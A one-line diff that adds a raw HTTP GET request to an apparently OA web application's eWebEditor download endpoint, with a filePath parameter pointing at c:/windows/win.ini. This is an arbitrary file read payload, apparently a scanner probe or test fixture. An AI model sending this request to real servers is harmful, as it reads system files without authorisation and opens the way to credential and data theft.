@@ -1,0 +1,1 @@
+GET /OAapp/jsp/trace_eWebEditor/downloadfortrace.jsp?filePath=c:/windows/win.ini  HTTP/1.1
